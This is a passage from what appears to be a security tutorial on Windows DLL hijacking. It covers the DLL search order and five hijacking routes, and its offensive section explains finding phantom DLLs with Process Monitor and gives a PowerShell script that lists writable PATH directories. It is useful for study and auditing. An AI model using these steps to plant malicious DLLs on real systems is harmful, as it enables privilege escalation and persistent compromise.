│ WHY IS THIS DANGEROUS?                                                       │
│ • Code runs with the application's privileges                               │
│ • If app runs as SYSTEM/Admin, so does malicious code                       │
│ • Persists as long as the vulnerable app is used                            │
│ • Hard to detect - looks like normal DLL loading                            │
│ • Survives reboots if DLL remains in place                                  │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Windows DLL Search Order

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DLL SEARCH ORDER (Windows 10/11)                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ STANDARD SEARCH ORDER (SafeDllSearchMode ENABLED - default):                │
│ ┌─────┬────────────────────────────────────────────────────────────────┐    │
│ │ #   │ Location                                                       │    │
│ ├─────┼────────────────────────────────────────────────────────────────┤    │
│ │ 1   │ Directory from which the application loaded (app folder)      │    │
│ │ 2   │ System directory (C:\Windows\System32)                        │    │
│ │ 3   │ 16-bit system directory (C:\Windows\System)                   │    │
│ │ 4   │ Windows directory (C:\Windows)                                │    │
│ │ 5   │ Current working directory (CWD)                               │    │
│ │ 6   │ Directories in PATH environment variable                      │    │
│ └─────┴────────────────────────────────────────────────────────────────┘    │
│                                                                              │
│ HIJACKING OPPORTUNITIES:                                                     │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ 1. APPLICATION DIRECTORY HIJACKING                                │      │
│ │    If app folder is writable (common in user-installed apps)     │      │
│ │    Place DLL in: C:\Program Files\VulnerableApp\evil.dll         │      │
│ │                                                                    │      │
│ │ 2. CURRENT DIRECTORY HIJACKING                                    │      │
│ │    If app loads DLLs from CWD (risky behavior)                   │      │
│ │    Open document from folder containing evil.dll                  │      │
│ │                                                                    │      │
│ │ 3. PATH DIRECTORY HIJACKING                                       │      │
│ │    If early PATH directory is writable                           │      │
│ │    Common: C:\Python27, C:\Users\<user>\AppData\Local\...       │      │
│ │                                                                    │      │
│ │ 4. PHANTOM DLL HIJACKING                                          │      │
│ │    App tries to load DLL that doesn't exist                       │      │
│ │    Provide the missing DLL with your code                        │      │
│ │                                                                    │      │
│ │ 5. DLL SIDE-LOADING                                                │      │
│ │    Abuse signed applications to load malicious DLLs              │      │
│ │    Bypasses application whitelisting                             │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ WINDOWS 11 CHANGES:                                                          │
│ • Stricter DLL loading by default                                           │
│ • More applications use DLL manifests to specify exact paths               │
│ • But legacy apps and third-party software still vulnerable                │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Offensive: Finding Vulnerable Applications

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ OFFENSIVE: FINDING DLL HIJACKING VULNERABILITIES                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ TOOL 1: PROCESS MONITOR (ProcMon)                                           │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │ 1. Download Process Monitor from Microsoft Sysinternals           │      │
│ │ 2. Set filters:                                                    │      │
│ │    - Operation: CreateFile                                        │      │
│ │    - Path: ends with .dll                                         │      │
│ │    - Result: NAME NOT FOUND                                       │      │
│ │                                                                    │      │
│ │ 3. Launch target application                                      │      │
│ │                                                                    │      │
│ │ 4. Look for results like:                                         │      │
│ │    ┌───────────────────────────────────────────────────────────┐  │      │
│ │    │ Time     Process        Path                    Result    │  │      │
│ │    │ 10:00:01 VulnApp.exe    C:\...\version.dll     NOT FOUND │  │      │
│ │    │ 10:00:01 VulnApp.exe    C:\...\helper.dll      NOT FOUND │  │      │
│ │    │ 10:00:02 VulnApp.exe    C:\Windows\msvc.dll    NOT FOUND │  │      │
│ │    └───────────────────────────────────────────────────────────┘  │      │
│ │                                                                    │      │
│ │ 5. These "NOT FOUND" DLLs are PHANTOM DLL opportunities!         │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ TOOL 2: DLL HIJACKING AUDITOR SCRIPTS                                        │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ # PowerShell: Find writable directories in PATH                  │      │
│ │ $env:PATH -split ';' | ForEach-Object {                           │      │
│ │     $path = $_                                                     │      │
│ │     try {                                                          │      │
│ │         $acl = Get-Acl $path -ErrorAction Stop                    │      │
│ │         $access = $acl.Access | Where-Object {                    │      │
│ │             $_.IdentityReference -match 'Users|Everyone' -and     │      │
│ │             $_.FileSystemRights -match 'Write|FullControl'        │      │
│ │         }                                                          │      │
│ │         if ($access) {                                            │      │
│ │             Write-Host "[VULN] Writable: $path" -ForegroundColor Red │
│ │         }                                                          │      │
│ │     } catch {}                                                     │      │
│ │ }                                                                   │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ COMMON VULNERABLE APPLICATIONS:                                              │
│ • Legacy enterprise software (still supporting Windows 7/8)                 │
│ • User-installed applications (writable install directories)               │
│ • Portable applications                                                      │
│ • Software installed per-user in AppData                                    │
│ • Development tools with writable PATH entries (Python, Node, etc.)        │
│ • VPN clients and security software (ironic)                                │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```
